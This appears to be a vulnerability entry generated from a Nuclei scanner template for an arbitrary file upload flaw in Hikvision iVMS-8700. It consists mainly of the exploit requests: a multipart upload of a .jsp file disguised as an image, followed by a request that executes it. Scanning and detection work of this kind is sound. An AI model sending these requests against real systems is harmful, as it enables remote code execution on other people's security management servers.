# Vulnerability: Hikvision iVMS-8700 - File Upload Remote Code Execution
**Classification:** HIKVISION
**Source:** Nuclei Template (`hikvision-ivms-file-upload-rce.yaml`)

## Description
Arbitrary file upload vulnerability in HIKVISION iVMS-8700 Integrated Security Management Platform Software allows attackers to upload and execute malicious files, leading to potential unauthorized server control.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /eps/resourceOperations/upload.action HTTP/1.1
Host: {{Hostname}}
User-Agent: MicroMessenger
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj

------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="{{str1}}.jsp"
Content-Type: image/jpeg

{{str3}}
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--

GET /eps/upload/{{res_id}}.jsp HTTP/1.1
Host: {{Hostname}}
```

